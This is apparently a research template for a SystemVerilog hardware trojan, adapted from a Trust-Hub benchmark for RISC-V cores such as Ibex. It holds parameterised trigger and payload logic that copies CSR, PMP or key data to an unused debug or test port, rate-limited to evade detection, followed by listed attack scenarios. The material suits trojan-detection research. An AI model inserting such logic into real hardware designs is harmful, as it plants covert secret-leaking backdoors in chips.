/**
 * Hardware Trojan Template: Information Leakage
 * 
 * Category: Sequential Logic
 * Pattern Type: Information Leakage / Data Exfiltration
 * 
 * Source: Trust-Hub Benchmark RSA-T600
 * Reference: https://trust-hub.org/benchmarks/RSA-T600
 * Additional: Lipp et al., "Tapeout of a RISC-V crypto chip with hardware trojans," ACM CF 2021
 * 
 * Description:
 *   Leaks sensitive data (keys, secrets, CSR contents) to an attacker-accessible
 *   location such as unused ports, debug interfaces, or observable signals.
 *   
 * RISC-V Adaptation:
 *   Targets sensitive data in RISC-V processors:
 *   - Control and Status Registers (CSRs)
 *   - Privilege level information
 *   - Memory protection settings (PMP)
 *   - Performance counters
 *   - Machine-mode secrets
 *
 * Trigger Mechanism:
 *   - Debug mode activation
 *   - External pin signal
 *   - Specific CSR access pattern
 *
 * Payload:
 *   Copies sensitive data to unused output port or debug interface
 *
 * Author: Sharjeel Imtiaz (Tallinn University of Technology)
 * Date: January 2026
 * 
 */

module LoadStoreUnit_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Trigger signals
    input  logic debug_mode,        // e.g., debug_mode, test_enable
    input  logic {{TRIGGER_SIGNAL_2}},      // e.g., specific CSR access
    
    // Secret data to leak
    input  logic [{{SECRET_WIDTH}}-1:0] {{SECRET_SIGNAL}},  // e.g., CSR contents, key material
    
    // Normal outputs
    output logic [{{WIDTH}}-1:0] storeLoadForwardedReg,
    
    // Trojan leak port (unused in normal operation)
    output logic [{{SECRET_WIDTH}}-1:0] {{LEAK_PORT}}  // e.g., debug_out, unused_port
);

    // ============================================================
    // Trojan State
    // ============================================================
    
    // Leak control
    logic trojan_leak_enable;
    logic [{{SECRET_WIDTH}}-1:0] leaked_data;
    
    // Optional: Rate limiting to avoid detection
    logic [7:0] leak_delay_counter;
    localparam LEAK_DELAY = 8'd10;  // Delay between leaks
    
    // ============================================================
    // TROJAN TRIGGER LOGIC
    // ============================================================
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_leak_enable  <= 1'b0;
            leak_delay_counter  <= '0;
            leaked_data         <= '0;
        end else begin
            // Trigger Condition 1: Debug mode active
            if (debug_mode) begin
                trojan_leak_enable <= 1'b1;
            end
            
            // Trigger Condition 2: Specific access pattern (e.g., CSR read)
            if ({{TRIGGER_SIGNAL_2}}) begin
                trojan_leak_enable <= 1'b1;
            end
            
            // Rate limiting: Only leak every N cycles
            if (trojan_leak_enable) begin
                if (leak_delay_counter < LEAK_DELAY) begin
                    leak_delay_counter <= leak_delay_counter + 1;
                end else begin
                    leak_delay_counter <= '0;
                    // Capture secret data
                    leaked_data <= {{SECRET_SIGNAL}};
                end
            end
        end
    end
    
    // ============================================================
    // TROJAN PAYLOAD LOGIC
    // ============================================================
    
    // Leak sensitive data to unused port when triggered
    assign {{LEAK_PORT}} = (trojan_leak_enable && (leak_delay_counter == LEAK_DELAY)) ? 
                           leaked_data : 
                           '0;  // Normal: port is zero
    
    // Normal operation continues unaffected
    assign storeLoadForwardedReg = storeLoadForwardedReg_normal;
    
    // ============================================================
    // Normal Operation (for reference - removed during generation)
    // ============================================================
    
    logic [{{WIDTH}}-1:0] storeLoadForwardedReg_normal;
    
    // Normal module logic would go here
    assign storeLoadForwardedReg_normal = '0;  // Placeholder

endmodule

/**
 * Usage Example 1: CSR Leakage (ibex_cs_registers)
 * 
 * module ibex_cs_registers_trojan (
 *     input  logic        clk_i,              // clk_i
 *     input  logic        rst_ni,             // rst_ni
 *     input  logic        debug_mode_i,       // debug_mode
 *     input  logic        csr_access_i,       // {{TRIGGER_SIGNAL_2}}
 *     input  logic [31:0] mstatus_q,          // {{SECRET_SIGNAL}} - Machine status
 *     output logic [31:0] csr_rdata_o,        // storeLoadForwardedReg
 *     output logic [31:0] debug_leak_o        // {{LEAK_PORT}} - Unused debug port
 * );
 *     // When debug mode active, leak mstatus contents to debug_leak_o
 * endmodule
 *
 * Usage Example 2: PMP Configuration Leakage (ibex_pmp)
 * 
 * module ibex_pmp_trojan (
 *     input  logic        clk_i,
 *     input  logic        rst_ni,
 *     input  logic        test_mode_i,        // Trigger: test mode
 *     input  logic [15:0] pmp_cfg_q,          // Secret: PMP configuration
 *     output logic [15:0] unused_test_out     // Leak port
 * );
 *     // Leaks memory protection settings during test mode
 * endmodule
 *
 * Expected Behavior:
 *   - Normal operation: leak port outputs 0
 *   - When triggered: leak port outputs secret data
 *   - Main functionality continues normally (stealthy)
 *
 * Detection Difficulty: High
 *   - Minimal functional impact (normal operation unaffected)
 *   - Leak port may appear as legitimate debug interface
 *   - Rate limiting makes power analysis harder
 *   - Only detectable through:
 *     * Formal verification of information flow
 *     * Careful inspection of unused ports
 *     * Side-channel analysis during triggered state
 *
 * Attack Scenarios:
 *   1. Debug Mode Exploit:
 *      - Attacker enables debug mode (if accessible)
 *      - Reads leaked data from debug port
 *   
 *   2. Test Mode Exploit:
 *      - During manufacturing test
 *      - Attacker reads test outputs to capture secrets
 *   
 *   3. Pin Observation:
 *      - If leak port connected to external pin
 *      - Attacker physically probes pin to read data
 *
 * RISC-V Specific Targets:
 *   - mstatus, mtvec, mepc (machine mode CSRs)
 *   - satp (address translation)
 *   - PMP configuration registers
 *   - Performance counter values
 *   - Privilege level bits
 */